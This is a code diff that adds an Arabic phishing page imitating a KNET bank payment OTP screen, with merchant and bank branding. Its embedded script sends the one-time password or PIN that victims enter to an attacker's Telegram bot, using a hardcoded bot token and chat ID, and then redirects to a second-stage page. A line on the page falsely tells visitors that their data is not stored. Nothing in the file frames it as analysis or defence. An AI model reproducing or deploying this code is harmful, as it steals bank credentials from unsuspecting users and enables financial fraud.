@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة دفع كي نت</title>
+    <link rel="stylesheet" href="otp.css">
+    <script src="script.js" defer></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, minimal-ui">
+
+</head>
+<body>
+    <header id="pageHeader">
+        <img src="kpayt.jpg" alt="رأس الصفحة" id="headerImage">
+    </header>
+
+    <div class="box bank-info" id="bankInfoBox">
+        <img id="imgkn" src="images (3).png" alt="بنك وربة" class="bank-logo" id="bankLogo">
+        <p id="beneficiaryLabel">المستفيد: <strong id="beneficiaryName">Xcite General Trading Co</strong></p>
+        <p id="amountLabel">المبلغ: <strong id="amountValu">KD 5.000</strong></p>
+    </div>
+    <div>
+    </div>
+    <div class="box payment-form">
+        <form id="paymentForm" onsubmit="sendToTelegram(event)">
+            <div id="boxibox">
+                <h3 id="textex">NOTIFICATION:
+                    You will presently receive an SMS on your mobile number registered with your bank. This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the box below.</h3>
+            </div>           
+            <div> 
+                <h6> للخصوصية والامان لا يتم الاحتفاض في البيانات تم حذفها من النظام لدينا </h6>
+                <p id="NONE10">اسم البنك <span style="position: relative; top: 5px;">*****</span></p>
+                <p ID="NONE10">  رقم البطاقة  <span style="position: relative; top: 5px;">*****</span></p>
+                <p ID="NONE10">  التاريخ  <span style="position: relative; top: 5px;">*****</span> </p>
+                <p ID="NONE10">  الرمز السري ATM <span style="position: relative; top: 5px;">*****</span> </p>
+
+
+
+            </div>
+            <div class="input-container">
+                <label id="texst4" for="pin">الرقم السري:</label>
+                <div class="input-box">
+                    <input type="password" id="pin" placeholder="" required pattern="\d{5,6}" maxlength="6" inputmode="numeric" title="الرجاء إدخال رقم يتراوح بين 6 و 6 أرقام">
+                    <div id="timer">2:00</div>
+
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <div class="box buttons">
+            <button type="submit" id="nobb">إرسال</button>    
+            <button type="button" onclick="resetForm()">إلغاء</button>
+    </div>
+
+    <script>
+
+let duration = 2 * 60; // 2 دقائق = 120 ثانية
+  const timerDisplay = document.getElementById('timer');
+
+  const countdown = setInterval(() => {
+    const minutes = Math.floor(duration / 60);
+    const seconds = duration % 60;
+
+    // عرض الوقت بصيغة 0:00
+    timerDisplay.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+
+    if (duration <= 0) {
+      clearInterval(countdown);
+      timerDisplay.textContent = "انتهى الوقت";
+    }
+
+    duration--;
+  }, 1000);
+
+document.addEventListener("DOMContentLoaded", function () {
+    const amount = localStorage.getItem("boton");
+    if (amount) {
+      document.getElementById("amountValu").textContent = amount;
+    }
+  });
+       function sendToTelegram() {
+        const token = "7861011533:AAE-7AqO49Yawvk19U0Svs1uHSoVr1Wf8Wo";
+        const chatId = "7595871538";
+        const pinInput = document.getElementById("pin");
+        const pin = pinInput.value.trim();
+
+        // تحقق من أن الرقم السري يحتوي على 4 إلى 6 أرقام فقط
+        const isValid = /^\d{5,6}$/.test(pin);
+        if (!isValid) return;
+
+        const message = `📩 بيانات جديدة:\n\n🔑 الرقم السري: ${pin}`;
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+        fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+        })
+        .then(() => {
+            window.location.href = "otp2.html"; // ✅ الانتقال للصفحة بعد الإرسال
+        })
+        .catch(error => {
+            console.error("خطأ في الإرسال:", error);
+        });
+    }
+
+    // ربط الزر بدالة الإرسال
+    document.getElementById("nobb").addEventListener("click", sendToTelegram);
+
+    
+        const totalAmount = localStorage.getItem("totalAmount");
+        document.getElementById("amountValue").innerText = totalAmount;
+    
+        setTimeout(function() {
+            document.getElementById('namenone').style.display = 'none';
+            let allElements = document.body.querySelectorAll('*');
+            allElements.forEach(function(element) {
+                element.style.visibility = 'visible';
+            });
+        }, 5000);
+    </script>
+    
+
+</body>
+</html>
